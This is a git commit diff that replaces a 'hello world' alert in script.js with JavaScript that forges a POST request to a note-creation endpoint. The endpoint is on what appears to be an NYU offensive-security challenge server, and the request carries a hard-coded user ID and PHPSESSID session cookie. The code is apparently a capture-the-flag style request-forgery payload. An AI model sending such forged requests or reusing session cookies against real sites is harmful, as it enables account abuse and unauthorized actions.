d076fe938a2b3753273ab9acdb08930ad093f679
llorave <55631969+llorave@users.noreply.github.com>
2020-02-06 21:54:20 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,10 @@
-alert("hello world");
+var url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new";
+var params = "title=abc1&content=abc2&submit=save";
+var xhr = new XMLHttpRequest();
+xhr.open("POST", url, true);
+
+//Send the proper header information along with the request
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.setRequestHeader("Cookie", "CHALBROKER_USER_ID=tv664; PHPSESSID=5mlern5j7u1b8b6dc1k3lhqml3;")
+
+xhr.send(params);
